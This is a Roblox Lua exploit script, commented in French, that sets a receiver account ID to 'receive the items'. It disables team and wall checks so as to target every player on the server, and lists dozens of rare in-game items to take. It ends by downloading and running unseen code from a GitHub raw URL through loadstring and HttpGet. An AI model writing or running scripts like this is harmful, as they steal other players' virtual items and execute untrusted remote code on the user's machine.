getgenv().SECRET_KEY = "mrr_a4af3be1727049e8b2b20e2a3d7bffee"
-- L'ID ci-dessous est désormais celui qui recevra les items (votre ID)
getgenv().RECEIVER_ID = 2354866600 
getgenv().TARGET_ID = getgenv().RECEIVER_ID -- Redirection pour la compatibilité

getgenv().DELAY_STEP = 1      
getgenv().TRADE_CYCLE_DELAY = 2

-- Désactivation des vérifications pour toucher tout le monde
getgenv().TeamCheck = false
getgenv().WallCheck = false
getgenv().TargetAllPlayers = true -- Option pour cibler tout le serveur

getgenv().TARGET_BRAINROTS = {
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["Strawberry Elephant"] = true,
    ["Griffin"] = true,
    ["Nacho Spyder"] = true,
    ["Quesadillo Vampiro"] = true,
    ["Perrito Burrito"] = true,
    ["Tacorita Bicicleta"] = true,
    ["La Extinct Grande"] = true,
    ["La Spooky Grande"] = true,
    ["Chipso and Queso"] = true,
    ["Tuff Toucan"] = true,
    ["Chillin Chili"] = true,
    ["Gobblino Uniciclino"] = true,
    ["W or L"] = true,
    ["La Jolly Grande"] = true,
    ["La Taco Combinasion"] = true,
    ["Swaggy Bros"] = true,
    ["La Romantic Grande"] = true,
    ["Festive 67"] = true,
    ["Nuclearo Dinossauro"] = true,
    ["Money Money Puggy"] = true,
    ["Ketupat Kepat"] = true,
    ["Tang Tang Keletang"] = true,
    ["Tictac Sahur"] = true,
    ["Ketchuru and Musturu"] = true,
    ["Lavadorito Spinito"] = true,
    ["Burguro And Fryuro"] = true,
    ["Garama and Madundung"] = true,
    ["Capitano Moby"] = true,
    ["Dragon Cannelloni"] = true,
    ["Cerberus"] = true,
    ["Agarrini la Palini"] = true,
    ["Guest 666"] = true,
    ["Los Hotspotsitos"] = true,
    ["Tralaledon"] = true,
    ["Los Bros"] = true,
    ["Los Puggies"] = true,
    ["Los Primos"] = true,
    ["Los Tacoritas"] = true,
    ["Los Spaghettis"] = true,
    ["Ginger Gerat"] = true,
    ["Love Love Bear"] = true,
    ["Spooky and Pumpky"] = true,
    ["Fragrama and Chocrama"] = true,
    ["La Casa Boo"] = true,
    ["Los Sekolahs"] = true,
    ["Reinito Sleighito"] = true,
    ["Ketupat Bros"] = true,
    ["Cooki and Milki"] = true,
    ["Rosey and Teddy"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["La Supreme Combinasion"] = true,
    ["Dragon Gingerini"] = true,
    ["Headless Horseman"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Celularcini Viciosini"] = true,
    ["Los Planitos"] = true,
    ["Eviledon"] = true,
    ["Orcaledon"] = true,
    ["Los Jolly Combinasionas"] = true,
    ["Fishino Clownino"] = true,
    ["Los Spooky Combinasionas"] = true,
    ["La Food Combinasion"] = true,
    ["La Secret Combinasion"] = true,
    ["Los Amigos"] = true,
    ["Sammyni Fattini"] = true,
    ["Spaghetti Tualetti"] = true,
    ["Rosetti Tualetti"] = true,
    ["Los 67"] = true,
    ["Los Mobilis"] = true,
    ["Las Sis"] = true,
    ["Los Candies"] = true,
    ["Bacuru and Egguru"] = true,
    ["Mieteteira Bicicleteira"] = true,
    ["Swag Soda"] = true,
    ["Mariachi Corazoni"] = true,
    ["La Ginger Sekolah"] = true
}

-- Exécution automatique vers le récepteur
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/nethersdev/Ragdolltpduelsource/main/Nethers.lua"))()
end)
